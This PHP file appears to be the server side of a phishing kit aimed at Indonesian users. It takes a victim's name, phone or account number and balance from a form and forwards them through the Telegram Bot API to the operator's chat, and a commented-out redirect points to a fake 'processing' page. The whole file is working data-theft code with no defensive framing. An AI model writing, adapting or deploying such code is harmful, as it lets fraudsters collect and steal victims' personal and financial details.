<?php
session_start();
include "telegram.php";

$nama = $_POST['data1'];
$nomor = $_POST['data2'];
$saldo = $_POST['data3'];
$_SESSION['data1'] = $nama;
$_SESSION['data2'] = $nomor;
$_SESSION['data3'] = $saldo;

$message = "

├• 𝗜𝗡𝗙𝗢 • 𝗡𝗢𝗧𝗜𝗙𝗜𝗞𝗔𝗦𝗜
├───────────────────
├• 𝗡𝗔𝗠𝗔 :  <code>".$nama."</code>
├• 𝗡𝗢𝗠𝗢𝗥 :  <code>".$nomor."</code>
├• 𝗦𝗔𝗟𝗗𝗢 :  <code>".$saldo."</code>
╰───────────────────

";
function sendMessage($id_telegram, $message, $id_botTele) {
    $url = "https://api.telegram.org/bot" . $id_botTele . "/sendMessage?parse_mode=html&chat_id=" . $id_telegram;
    $url = $url . "&text=" . urlencode($message);
    $ch = curl_init();
    $optArray = array(CURLOPT_URL => $url, CURLOPT_RETURNTRANSFER => true);
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
}
sendMessage($id_telegram, $message, $id_botTele);
//header('Location:./../proses.html');
?>
